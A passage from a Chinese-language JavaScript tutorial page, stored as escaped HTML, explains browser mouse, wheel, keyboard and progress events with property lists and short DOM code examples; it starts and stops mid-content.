ul = document.querySelector(&#039;ul&#039;);\n\n// 先进入 ul 节点，然后在节点内部移动，不会触发 mouseleave 事件\n// 只有离开 ul 节点时，触发一次 mouseleave\n// event.target 是 ul 节点\nul.addEventListener(&#039;mouseleave&#039;, function (event) {\n  event.target.style.color = &#039;purple&#039;;\n  setTimeout(function () {\n    event.target.style.color = &#039;&#039;;\n  }, 500);\n}, false);\n\n// 先进入 ul 节点，然后在节点内部移动，mouseout 事件会触发多次\n// event.target 是 li 节点\nul.addEventListener(&#039;mouseout&#039;, function (event) {\n  event.target.style.color = &#039;orange&#039;;\n  setTimeout(function () {\n    event.target.style.color = &#039;&#039;;\n  }, 500);\n}, false);</code></pre><p>上面代码中，在父节点内部离开子节点，不会触发<code>mouseleave</code>事件，但是会触发<code>mouseout</code>事件。</p>\n\n        <h2>\n            <a href='#MouseEvent-接口概述' class='header-anchor'>#</a>\n            <span>MouseEvent 接口概述</span>\n        </h2>\n    <p><code>MouseEvent</code>接口代表了鼠标相关的事件，单击（click）、双击（dblclick）、松开鼠标键（mouseup）、按下鼠标键（mousedown）等动作，所产生的事件对象都是<code>MouseEvent</code>实例。此外，滚轮事件和拖拉事件也是<code>MouseEvent</code>实例。</p>\n<p><code>MouseEvent</code>接口继承了<code>Event</code>接口，所以拥有<code>Event</code>的所有属性和方法。它还有自己的属性和方法。</p>\n<p>浏览器原生提供一个<code>MouseEvent</code>构造函数，用于新建一个<code>MouseEvent</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var event = new MouseEvent(type, options);</code></pre><p><code>MouseEvent</code>构造函数接受两个参数。第一个参数是字符串，表示事件名称；第二个参数是一个事件配置对象，该参数可选。除了<code>Event</code>接口的实例配置属性，该对象可以配置以下属性，所有属性都是可选的。</p>\n<ul>\n<li><code>screenX</code>：数值，鼠标相对于屏幕的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。</li>\n<li><code>screenY</code>：数值，鼠标相对于屏幕的垂直位置（单位像素），其他与<code>screenX</code>相同。</li>\n<li><code>clientX</code>：数值，鼠标相对于程序窗口的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。</li>\n<li><code>clientY</code>：数值，鼠标相对于程序窗口的垂直位置（单位像素），其他与<code>clientX</code>相同。</li>\n<li><code>ctrlKey</code>：布尔值，是否同时按下了 Ctrl 键，默认值为<code>false</code>。</li>\n<li><code>shiftKey</code>：布尔值，是否同时按下了 Shift 键，默认值为<code>false</code>。</li>\n<li><code>altKey</code>：布尔值，是否同时按下 Alt 键，默认值为<code>false</code>。</li>\n<li><code>metaKey</code>：布尔值，是否同时按下 Meta 键，默认值为<code>false</code>。</li>\n<li><code>button</code>：数值，表示按下了哪一个鼠标按键，默认值为<code>0</code>，表示按下主键（通常是鼠标的左键）或者当前事件没有定义这个属性；<code>1</code>表示按下辅助键（通常是鼠标的中间键），<code>2</code>表示按下次要键（通常是鼠标的右键）。</li>\n<li><code>buttons</code>：数值，表示按下了鼠标的哪些键，是一个三个比特位的二进制值，默认为<code>0</code>（没有按下任何键）。<code>1</code>（二进制<code>001</code>）表示按下主键（通常是左键），<code>2</code>（二进制<code>010</code>）表示按下次要键（通常是右键），<code>4</code>（二进制<code>100</code>）表示按下辅助键（通常是中间键）。因此，如果返回<code>3</code>（二进制<code>011</code>）就表示同时按下了左键和右键。</li>\n<li><code>relatedTarget</code>：节点对象，表示事件的相关节点，默认为<code>null</code>。<code>mouseenter</code>和<code>mouseover</code>事件时，表示鼠标刚刚离开的那个元素节点；<code>mouseout</code>和<code>mouseleave</code>事件时，表示鼠标正在进入的那个元素节点。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>function simulateClick() {\n  var event = new MouseEvent(&#039;click&#039;, {\n    &#039;bubbles&#039;: true,\n    &#039;cancelable&#039;: true\n  });\n  var cb = document.getElementById(&#039;checkbox&#039;);\n  cb.dispatchEvent(event);\n}</code></pre><p>上面代码生成一个鼠标点击事件，并触发该事件。</p>\n\n        <h2>\n            <a href='#MouseEvent-接口的实例属性' class='header-anchor'>#</a>\n            <span>MouseEvent 接口的实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey' class='header-anchor'>#</a>\n            <span>MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey</span>\n        </h3>\n    <p><code>MouseEvent.altKey</code>、<code>MouseEvent.ctrlKey</code>、<code>MouseEvent.metaKey</code>、<code>MouseEvent.shiftKey</code>这四个属性都返回一个布尔值，表示事件发生时，是否按下对应的键。它们都是只读属性。</p>\n<ul>\n<li><code>altKey</code>属性：Alt 键</li>\n<li><code>ctrlKey</code>属性：Ctrl 键</li>\n<li><code>metaKey</code>属性：Meta 键（Mac 键盘是一个四瓣的小花，Windows 键盘是 Windows 键）</li>\n<li><code>shiftKey</code>属性：Shift 键</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;body onclick=&quot;showKey(event)&quot;&gt;\nfunction showKey(e) {\n  console.log(&#039;ALT key pressed: &#039; + e.altKey);\n  console.log(&#039;CTRL key pressed: &#039; + e.ctrlKey);\n  console.log(&#039;META key pressed: &#039; + e.metaKey);\n  console.log(&#039;SHIFT key pressed: &#039; + e.shiftKey);\n}</code></pre><p>上面代码中，点击网页会输出是否同时按下对应的键。</p>\n\n        <h3>\n            <a href='#MouseEvent.button，MouseEvent.buttons' class='header-anchor'>#</a>\n            <span>MouseEvent.button，MouseEvent.buttons</span>\n        </h3>\n    <p><code>MouseEvent.button</code>属性返回一个数值，表示事件发生时按下了鼠标的哪个键。该属性只读。</p>\n<ul>\n<li>0：按下主键（通常是左键），或者该事件没有初始化这个属性（比如<code>mousemove</code>事件）。</li>\n<li>1：按下辅助键（通常是中键或者滚轮键）。</li>\n<li>2：按下次键（通常是右键）。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;button onmouseup=&quot;whichButton(event)&quot;&gt;点击&lt;/button&gt;\nvar whichButton = function (e) {\n  switch (e.button) {\n    case 0:\n      console.log(&#039;Left button clicked.&#039;);\n      break;\n    case 1:\n      console.log(&#039;Middle button clicked.&#039;);\n      break;\n    case 2:\n      console.log(&#039;Right button clicked.&#039;);\n      break;\n    default:\n      console.log(&#039;Unexpected code: &#039; + e.button);\n  }\n}</code></pre><p><code>MouseEvent.buttons</code>属性返回一个三个比特位的值，表示同时按下了哪些键。它用来处理同时按下多个鼠标键的情况。该属性只读。</p>\n<ul>\n<li>1：二进制为<code>001</code>（十进制的1），表示按下左键。</li>\n<li>2：二进制为<code>010</code>（十进制的2），表示按下右键。</li>\n<li>4：二进制为<code>100</code>（十进制的4），表示按下中键或滚轮键。</li>\n</ul>\n<p>同时按下多个键的时候，每个按下的键对应的比特位都会有值。比如，同时按下左键和右键，会返回3（二进制为011）。</p>\n\n        <h3>\n            <a href='#MouseEvent.clientX，MouseEvent.clientY' class='header-anchor'>#</a>\n            <span>MouseEvent.clientX，MouseEvent.clientY</span>\n        </h3>\n    <p><code>MouseEvent.clientX</code>属性返回鼠标位置相对于浏览器窗口左上角的水平坐标（单位像素），<code>MouseEvent.clientY</code>属性返回垂直坐标。这两个属性都是只读属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;body onmousedown=&quot;showCoords(event)&quot;&gt;\nfunction showCoords(evt){\n  console.log(\n    &#039;clientX value: &#039; + evt.clientX + &#039;\\n&#039; +\n    &#039;clientY value: &#039; + evt.clientY + &#039;\\n&#039;\n  );\n}</code></pre><p>这两个属性还分别有一个别名<code>MouseEvent.x</code>和<code>MouseEvent.y</code>。</p>\n\n        <h3>\n            <a href='#MouseEvent.movementX，MouseEvent.movementY' class='header-anchor'>#</a>\n            <span>MouseEvent.movementX，MouseEvent.movementY</span>\n        </h3>\n    <p><code>MouseEvent.movementX</code>属性返回当前位置与上一个<code>mousemove</code>事件之间的水平距离（单位像素）。数值上，它等于下面的计算公式。</p>\n<pre class=\"prettyprint language-javascript\"><code>currentEvent.movementX = currentEvent.screenX - previousEvent.screenX</code></pre><p><code>MouseEvent.movementY</code>属性返回当前位置与上一个<code>mousemove</code>事件之间的垂直距离（单位像素）。数值上，它等于下面的计算公式。</p>\n<pre class=\"prettyprint language-javascript\"><code>currentEvent.movementY = currentEvent.screenY - previousEvent.screenY。</code></pre><p>这两个属性都是只读属性。</p>\n\n        <h3>\n            <a href='#MouseEvent.screenX，MouseEvent.screenY' class='header-anchor'>#</a>\n            <span>MouseEvent.screenX，MouseEvent.screenY</span>\n        </h3>\n    <p><code>MouseEvent.screenX</code>属性返回鼠标位置相对于屏幕左上角的水平坐标（单位像素），<code>MouseEvent.screenY</code>属性返回垂直坐标。这两个属性都是只读属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;body onmousedown=&quot;showCoords(event)&quot;&gt;\nfunction showCoords(evt) {\n  console.log(\n    &#039;screenX value: &#039; + evt.screenX + &#039;\\n&#039;\n    &#039;screenY value: &#039; + evt.screenY + &#039;\\n&#039;\n  );\n}</code></pre>\n        <h3>\n            <a href='#MouseEvent.offsetX，MouseEvent.offsetY' class='header-anchor'>#</a>\n            <span>MouseEvent.offsetX，MouseEvent.offsetY</span>\n        </h3>\n    <p><code>MouseEvent.offsetX</code>属性返回鼠标位置与目标节点左侧的<code>padding</code>边缘的水平距离（单位像素），<code>MouseEvent.offsetY</code>属性返回与目标节点上方的<code>padding</code>边缘的垂直距离。这两个属性都是只读属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n  &lt;style&gt;\n    p {\n      width: 100px;\n      height: 100px;\n      padding: 100px;\n    }\n  &lt;/style&gt;\n  &lt;p&gt;Hello&lt;/p&gt;\n*/\nvar p = document.querySelector(&#039;p&#039;);\np.addEventListener(\n  &#039;click&#039;,\n  function (e) {\n    console.log(e.offsetX);\n    console.log(e.offsetY);\n  },\n  false\n);</code></pre><p>上面代码中，鼠标如果在<code>p</code>元素的中心位置点击，会返回<code>150 150</code>。因此中心位置距离左侧和上方的<code>padding</code>边缘，等于<code>padding</code>的宽度（100像素）加上元素内容区域一半的宽度（50像素）。</p>\n\n        <h3>\n            <a href='#MouseEvent.pageX，MouseEvent.pageY' class='header-anchor'>#</a>\n            <span>MouseEvent.pageX，MouseEvent.pageY</span>\n        </h3>\n    <p><code>MouseEvent.pageX</code>属性返回鼠标位置与文档左侧边缘的距离（单位像素），<code>MouseEvent.pageY</code>属性返回与文档上侧边缘的距离（单位像素）。它们的返回值都包括文档不可见的部分。这两个属性都是只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n  &lt;style&gt;\n    body {\n      height: 2000px;\n    }\n  &lt;/style&gt;\n*/\ndocument.body.addEventListener(\n  &#039;click&#039;,\n  function (e) {\n    console.log(e.pageX);\n    console.log(e.pageY);\n  },\n  false\n);</code></pre><p>上面代码中，页面高度为2000像素，会产生垂直滚动条。滚动到页面底部，点击鼠标输出的<code>pageY</code>值会接近2000。</p>\n\n        <h3>\n            <a href='#MouseEvent.relatedTarget' class='header-anchor'>#</a>\n            <span>MouseEvent.relatedTarget</span>\n        </h3>\n    <p><code>MouseEvent.relatedTarget</code>属性返回事件的相关节点。对于那些没有相关节点的事件，该属性返回<code>null</code>。该属性只读。</p>\n<p>下表列出不同事件的<code>target</code>属性值和<code>relatedTarget</code>属性值义。</p>\n<table>\n<thead>\n<tr>\n<th>事件名称</th>\n<th>target 属性</th>\n<th>relatedTarget 属性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>focusin</td>\n<td>接受焦点的节点</td>\n<td>丧失焦点的节点</td>\n</tr>\n<tr>\n<td>focusout</td>\n<td>丧失焦点的节点</td>\n<td>接受焦点的节点</td>\n</tr>\n<tr>\n<td>mouseenter</td>\n<td>将要进入的节点</td>\n<td>将要离开的节点</td>\n</tr>\n<tr>\n<td>mouseleave</td>\n<td>将要离开的节点</td>\n<td>将要进入的节点</td>\n</tr>\n<tr>\n<td>mouseout</td>\n<td>将要离开的节点</td>\n<td>将要进入的节点</td>\n</tr>\n<tr>\n<td>mouseover</td>\n<td>将要进入的节点</td>\n<td>将要离开的节点</td>\n</tr>\n<tr>\n<td>dragenter</td>\n<td>将要进入的节点</td>\n<td>将要离开的节点</td>\n</tr>\n<tr>\n<td>dragexit</td>\n<td>将要离开的节点</td>\n<td>将要进入的节点</td>\n</tr>\n</tbody></table>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>/*\n  HTML 代码如下\n  &lt;div id=&quot;outer&quot; style=&quot;height:50px;width:50px;border-width:1px solid black;&quot;&gt;\n    &lt;div id=&quot;inner&quot; style=&quot;height:25px;width:25px;border:1px solid black;&quot;&gt;&lt;/div&gt;\n  &lt;/div&gt;\n*/\n\nvar inner = document.getElementById(&#039;inner&#039;);\ninner.addEventListener(&#039;mouseover&#039;, function (event) {\n  console.log(&#039;进入&#039; + event.target.id + &#039; 离开&#039; + event.relatedTarget.id);\n}, false);\ninner.addEventListener(&#039;mouseenter&#039;, function (event) {\n  console.log(&#039;进入&#039; + event.target.id + &#039; 离开&#039; + event.relatedTarget.id);\n});\ninner.addEventListener(&#039;mouseout&#039;, function () {\n  console.log(&#039;离开&#039; + event.target.id + &#039; 进入&#039; + event.relatedTarget.id);\n});\ninner.addEventListener(&quot;mouseleave&quot;, function (){\n  console.log(&#039;离开&#039; + event.target.id + &#039; 进入&#039; + event.relatedTarget.id);\n});\n\n// 鼠标从 outer 进入inner，输出\n// 进入inner 离开outer\n// 进入inner 离开outer\n\n// 鼠标从 inner进入 outer，输出\n// 离开inner 进入outer\n// 离开inner 进入outer</code></pre>\n        <h2>\n            <a href='#MouseEvent-接口的实例方法' class='header-anchor'>#</a>\n            <span>MouseEvent 接口的实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#MouseEvent.getModifierState()' class='header-anchor'>#</a>\n            <span>MouseEvent.getModifierState()</span>\n        </h3>\n    <p><code>MouseEvent.getModifierState</code>方法返回一个布尔值，表示有没有按下特定的功能键。它的参数是一个表示<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/getModifierState#Modifier_keys_on_Gecko\">功能键</a>的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.addEventListener(&#039;click&#039;, function (e) {\n  console.log(e.getModifierState(&#039;CapsLock&#039;));\n}, false);</code></pre><p>上面的代码可以了解用户是否按下了大写键。</p>\n\n        <h2>\n            <a href='#WheelEvent-接口' class='header-anchor'>#</a>\n            <span>WheelEvent 接口</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p>WheelEvent 接口继承了 MouseEvent 实例，代表鼠标滚轮事件的实例对象。目前，鼠标滚轮相关的事件只有一个<code>wheel</code>事件，用户滚动鼠标的滚轮，就生成这个事件的实例。</p>\n<p>浏览器原生提供<code>WheelEvent()</code>构造函数，用来生成<code>WheelEvent</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var wheelEvent = new WheelEvent(type, options);</code></pre><p><code>WheelEvent()</code>构造函数可以接受两个参数，第一个是字符串，表示事件类型，对于滚轮事件来说，这个值目前只能是<code>wheel</code>。第二个参数是事件的配置对象。该对象的属性除了<code>Event</code>、<code>UIEvent</code>的配置属性以外，还可以接受以下几个属性，所有属性都是可选的。</p>\n<ul>\n<li><code>deltaX</code>：数值，表示滚轮的水平滚动量，默认值是 0.0。</li>\n<li><code>deltaY</code>：数值，表示滚轮的垂直滚动量，默认值是 0.0。</li>\n<li><code>deltaZ</code>：数值，表示滚轮的 Z 轴滚动量，默认值是 0.0。</li>\n<li><code>deltaMode</code>：数值，表示相关的滚动事件的单位，适用于上面三个属性。<code>0</code>表示滚动单位为像素，<code>1</code>表示单位为行，<code>2</code>表示单位为页，默认为<code>0</code>。</li>\n</ul>\n\n        <h3>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h3>\n    <p><code>WheelEvent</code>事件实例除了具有<code>Event</code>和<code>MouseEvent</code>的实例属性和实例方法，还有一些自己的实例属性，但是没有自己的实例方法。</p>\n<p>下面的属性都是只读属性。</p>\n<ul>\n<li><code>WheelEvent.deltaX</code>：数值，表示滚轮的水平滚动量。</li>\n<li><code>WheelEvent.deltaY</code>：数值，表示滚轮的垂直滚动量。</li>\n<li><code>WheelEvent.deltaZ</code>：数值，表示滚轮的 Z 轴滚动量。</li>\n<li><code>WheelEvent.deltaMode</code>：数值，表示上面三个属性的单位，<code>0</code>是像素，<code>1</code>是行，<code>2</code>是页。</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"键盘事件","link":"/events/keyboard.html"}],"content":"\n        <h1>\n            <a href='#键盘事件' class='header-anchor'>#</a>\n            <span>键盘事件</span>\n        </h1>\n    \n        <h2>\n            <a href='#键盘事件的种类' class='header-anchor'>#</a>\n            <span>键盘事件的种类</span>\n        </h2>\n    <p>键盘事件由用户击打键盘触发，主要有<code>keydown</code>、<code>keypress</code>、<code>keyup</code>三个事件，它们都继承了<code>KeyboardEvent</code>接口。</p>\n<ul>\n<li><code>keydown</code>：按下键盘时触发。</li>\n<li><code>keypress</code>：按下有值的键时触发，即按下 Ctrl、Alt、Shift、Meta 这样无值的键，这个事件不会触发。对于有值的键，按下时先触发<code>keydown</code>事件，再触发这个事件。</li>\n<li><code>keyup</code>：松开键盘时触发该事件。</li>\n</ul>\n<p>如果用户一直按键不松开，就会连续触发键盘事件，触发的顺序如下。</p>\n<ol>\n<li>keydown</li>\n<li>keypress</li>\n<li>keydown</li>\n<li>keypress</li>\n<li>...（重复以上过程）</li>\n<li>keyup</li>\n</ol>\n\n        <h2>\n            <a href='#KeyboardEvent-接口概述' class='header-anchor'>#</a>\n            <span>KeyboardEvent 接口概述</span>\n        </h2>\n    <p><code>KeyboardEvent</code>接口用来描述用户与键盘的互动。这个接口继承了<code>Event</code>接口，并且定义了自己的实例属性和实例方法。</p>\n<p>浏览器原生提供<code>KeyboardEvent</code>构造函数，用来新建键盘事件的实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>new KeyboardEvent(type, options)</code></pre><p><code>KeyboardEvent</code>构造函数接受两个参数。第一个参数是字符串，表示事件类型；第二个参数是一个事件配置对象，该参数可选。除了<code>Event</code>接口提供的属性，还可以配置以下字段，它们都是可选。</p>\n<ul>\n<li><code>key</code>：字符串，当前按下的键，默认为空字符串。</li>\n<li><code>code</code>：字符串，表示当前按下的键的字符串形式，默认为空字符串。</li>\n<li><code>location</code>：整数，当前按下的键的位置，默认为<code>0</code>。</li>\n<li><code>ctrlKey</code>：布尔值，是否按下 Ctrl 键，默认为<code>false</code>。</li>\n<li><code>shiftKey</code>：布尔值，是否按下 Shift 键，默认为<code>false</code>。</li>\n<li><code>altKey</code>：布尔值，是否按下 Alt 键，默认为<code>false</code>。</li>\n<li><code>metaKey</code>：布尔值，是否按下 Meta 键，默认为<code>false</code>。</li>\n<li><code>repeat</code>：布尔值，是否重复按键，默认为<code>false</code>。</li>\n</ul>\n\n        <h2>\n            <a href='#KeyboardEvent-的实例属性' class='header-anchor'>#</a>\n            <span>KeyboardEvent 的实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#KeyboardEvent.altKey，KeyboardEvent.metaKey.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey' class='header-anchor'>#</a>\n            <span>KeyboardEvent.altKey，KeyboardEvent.metaKey.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey</span>\n        </h3>\n    <p>以下属性都是只读属性，返回一个布尔值，表示是否按下对应的键。</p>\n<ul>\n<li><code>KeyboardEvent.altKey</code>：是否按下 Alt 键</li>\n<li><code>KeyboardEvent.ctrlKey</code>：是否按下 Ctrl 键</li>\n<li><code>KeyboardEvent.metaKey</code>：是否按下 meta 键（Mac 系统是一个四瓣的小花，Windows 系统是 windows 键）</li>\n<li><code>KeyboardEvent.shiftKey</code>：是否按下 Shift 键</li>\n</ul>\n<p>下面是一个示例。</p>\n<pre class=\"prettyprint language-javascript\"><code>function showChar(e) {\n  console.log(&#039;ALT: &#039; + e.altKey);\n  console.log(&#039;CTRL: &#039; + e.ctrlKey);\n  console.log(&#039;Meta: &#039; + e.metaKey);\n  console.log(&#039;Meta: &#039; + e.shiftKey);\n}\n\ndocument.body.addEventListener(&#039;keydown&#039;, showChar, false);</code></pre>\n        <h3>\n            <a href='#KeyboardEvent.code' class='header-anchor'>#</a>\n            <span>KeyboardEvent.code</span>\n        </h3>\n    <p><code>KeyboardEvent.code</code>属性返回一个字符串，表示当前按下的键的字符串形式。该属性只读。</p>\n<p>下面是一些常用键的字符串形式，其他键请查<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/code#Code_values\">文档</a>。</p>\n<ul>\n<li>数字键0 - 9：返回<code>digital0</code> - <code>digital9</code></li>\n<li>字母键A - z：返回<code>KeyA</code> - <code>KeyZ</code></li>\n<li>功能键F1 - F12：返回 <code>F1</code> - <code>F12</code></li>\n<li>方向键：返回<code>ArrowDown</code>、<code>ArrowUp</code>、<code>ArrowLeft</code>、<code>ArrowRight</code></li>\n<li>Alt 键：返回<code>AltLeft</code>或<code>AltRight</code></li>\n<li>Shift 键：返回<code>ShiftLeft</code>或<code>ShiftRight</code></li>\n<li>Ctrl 键：返回<code>ControLeft</code>或<code>ControlRight</code></li>\n</ul>\n\n        <h3>\n            <a href='#KeyboardEvent.key' class='header-anchor'>#</a>\n            <span>KeyboardEvent.key</span>\n        </h3>\n    <p><code>KeyboardEvent.key</code>属性返回一个字符串，表示按下的键名。该属性只读。</p>\n<p>如果按下的键代表可打印字符，则返回这个字符，比如数字、字母。</p>\n<p>如果按下的键代表不可打印的特殊字符，则返回预定义的键值，比如 Backspace，Tab，Enter，Shift，Control，Alt，CapsLock，Esc，Spacebar，PageUp，PageDown，End，Home，Left，Right，Up，Down，PrintScreen，Insert，Del，Win，F1～F12，NumLock，Scroll 等。</p>\n<p>如果同时按下一个控制键和一个符号键，则返回符号键的键名。比如，按下 Ctrl + a，则返回<code>a</code>；按下 Shift + a，则返回大写的<code>A</code>。</p>\n<p>如果无法识别键名，返回字符串<code>Unidentified</code>。</p>\n\n        <h3>\n            <a href='#KeyboardEvent.location' class='header-anchor'>#</a>\n            <span>KeyboardEvent.location</span>\n        </h3>\n    <p><code>KeyboardEvent.location</code>属性返回一个整数，表示按下的键处在键盘的哪一个区域。它可能取以下值。</p>\n<ul>\n<li>0：处在键盘的主区域，或者无法判断处于哪一个区域。</li>\n<li>1：处在键盘的左侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。</li>\n<li>2：处在键盘的右侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。</li>\n<li>3：处在数字小键盘。</li>\n</ul>\n\n        <h3>\n            <a href='#KeyboardEvent.repeat' class='header-anchor'>#</a>\n            <span>KeyboardEvent.repeat</span>\n        </h3>\n    <p><code>KeyboardEvent.repeat</code>返回一个布尔值，代表该键是否被按着不放，以便判断是否重复这个键，即浏览器会持续触发<code>keydown</code>和<code>keypress</code>事件，直到用户松开手为止。</p>\n\n        <h2>\n            <a href='#KeyboardEvent-的实例方法' class='header-anchor'>#</a>\n            <span>KeyboardEvent 的实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#KeyboardEvent.getModifierState()' class='header-anchor'>#</a>\n            <span>KeyboardEvent.getModifierState()</span>\n        </h3>\n    <p><code>KeyboardEvent.getModifierState()</code>方法返回一个布尔值，表示是否按下或激活指定的功能键。它的常用参数如下。</p>\n<ul>\n<li><code>Alt</code>：Alt 键</li>\n<li><code>CapsLock</code>：大写锁定键</li>\n<li><code>Control</code>：Ctrl 键</li>\n<li><code>Meta</code>：Meta 键</li>\n<li><code>NumLock</code>：数字键盘开关键</li>\n<li><code>Shift</code>：Shift 键</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>if (\n  event.getModifierState(&#039;Control&#039;) +\n  event.getModifierState(&#039;Alt&#039;) +\n  event.getModifierState(&#039;Meta&#039;) &gt; 1\n) {\n  return;\n}</code></pre><p>上面代码表示，只要<code>Control</code>、<code>Alt</code>、<code>Meta</code>里面，同时按下任意两个或两个以上的键就返回。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"进度事件","link":"/events/progress.html"}],"content":"\n        <h1>\n            <a href='#进度事件' class='header-anchor'>#</a>\n            <span>进度事件</span>\n        </h1>\n    \n        <h2>\n            <a href='#进度事件的种类' class='header-anchor'>#</a>\n            <span>进度事件的种类</span>\n        </h2>\n    <p>进度事件用来描述资源加载的进度，主要由 AJAX 请求、<code>&lt;img&gt;</code>、<code>&lt;audio&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;style&gt;</code>、<code>&lt;link&gt;</code>等外部资源的加载触发，继承了<code>ProgressEvent</code>接口。它主要包含以下几种事件。</p>\n<ul>\n<li><code>abort</code>：外部资源中止加载时（比如用户取消）触发。如果发生错误导致中止，不会触发该事件。</li>\n<li><code>error</code>：由于错误导致外部资源无法加载时触发。</li>\n<li><code>load</code>：外部资源加载成功时触发。</li>\n<li><code>loadstart</code>：外部资源开始加载时触发。</li>\n<li><code>loadend</code>：外部资源停止加载时触发，发生顺序排在<code>error</code>、<code>abort</code>、<code>load</code>等事件的后面。</li>\n<li><code>progress</code>：外部资源加载过程中不断触发。</li>\n<li><code>timeout</code>：加载超时时触发。</li>\n</ul>\n<p>注意，除了资源下载，文件上传也存在这些事件。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>image.addEventListener(&#039;load&#039;, function (event) {\n  image.classList.add(&#039;finished&#039;);\n});\n\nimage.addEventListener(&#039;error&#039;, function (event) {\n  image.style.display = &#039;none&#039;;\n});</code></pre><p>上面代码在图片元素加载完成后，为图片元素添加一个<code>finished</code>的 Class。如果加载失败，就把图片元素的样式设置为不显示。</p>\n<p>有时候，图片加载会在脚本运行之前就完成，尤其是当脚本放置在网页底部的时候，因此有可能<code>load</code>和<code>error</code>事件的监听函数根本不会执行。所以，比较可靠的方式，是用<code>complete</code>属性先判断一下是否加载完成。</p>\n<pre class=\"prettyprint language-javascript\"><code>function loaded() {\n  // ...\n}\n\nif (image.complete) {\n  loaded();\n} else {\n  image.addEventListener(&#039;load&#039;, loaded);\n}</code></pre><p>由于 DOM 的元素节点没有提供是否加载错误的属性，所以<code>error</code>事件的监听函数最好放在<code>&lt;img&gt;</code>元素的 HTML 代码中，这样才能保证发生加载错误时百分之百会执行。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;img src=&quot;/wrong/url&quot; onerror=&quot;this.style.display=&#039;none&#039;;&quot; /&gt;</code></pre><p><code>loadend</code>事件的监听函数，可以用来取代<code>abort</code>事件、<code>load</code>事件、<code>error</code>事件的监听函数，因为它总是在这些事件之后发生。</p>\n<pre class=\"prettyprint language-javascript\"><code>req.addEventListener(&#039;loadend&#039;, loadEnd, false);\n\nfunction loadEnd(e) {\n  console.log(&#039;传输结束，成功失败未知&#039;);\n}</code></pre><p><code>loadend</code>事件本身不提供关于进度结束的原因，但可以用它来做所有加载结束场景都需要做的一些操作。</p>\n<p>另外，<code>error</code>事件有一个特殊的性质，就是不会冒泡。所以，子元素的<code>error</code>事件，不会触发父元素的<code>error</code>事件监听函数。</p>\n\n        <h2>\n            <a href='#ProgressEvent-接口' class='header-anchor'>#</a>\n            <span>ProgressEvent 接口</span>\n        </h2>\n    <p><code>ProgressEvent</code>接口主要用来描述外部资源加载的进度，比如 AJAX 加载、<code>&lt;img&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;style&gt;</code>、<code>&lt;link&gt;</code>等外部资源加载。进度相关的事件都继承了这个接口。</p>\n<p>浏览器原生提供了<code>ProgressEvent()</code>构造函数，用来生成事件实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>new ProgressEvent(type, options)</code></pre><p><code>ProgressEvent()</code>构造函数接受两个参数。第一个参数是字符串，表示事件的类型，这个参数是必须的。第二个参数是一个配置对象，表示事件的属性，该参数可选。配置对象除了可以使用<code>Event</code>接口的配置属性，还可以使用下面的属性，所有这些属性都是可选的。</p>\n<ul>\n<li><code>lengthComputable</code>：布尔值，表示加载的总量是否可以计算，默认是<code>false</code>。</li>\n<li><code>loaded</code>：整数，表示已经加载的量，默认是<code>0</code>。</li>\n<li><code>total</code>：整数，表示需要加载的总量，默认是<code>0</code>。</li>\n</ul>\n<p><code>ProgressEvent</code>具有对应的实例属性。</p>\n<ul>\n<li><code>ProgressEvent.lengthComputable</code></li>\n<li><code>ProgressEvent.loaded</code></li>\n<li><code>ProgressEvent.total</code></li>\n</ul>\n<p>如果<code>ProgressEvent.lengthComputable</code>为<code>false</code>，<code>ProgressEvent.total</code>实际上是没有意义的。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = new ProgressEvent(&#039;load&#039;, {\n  lengthComputable: true,\n  loaded: 30,\n  total: 100,\n});\n\ndocument.body.addEventListener(&#039;load&#039;, function (e) {\n  console.log(&#039;已经加载：&#039; + (e.loaded / e.total) * 100 + &#039;%&#039;);\n});\n\ndocument.body.dispatchEvent(p);\n// 已经加载：30%</code></pre><p>上面代码先构造一个<code>load</code>事件，抛出后被监听函数捕捉到。</p>\n<p>下面是一个实际的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new 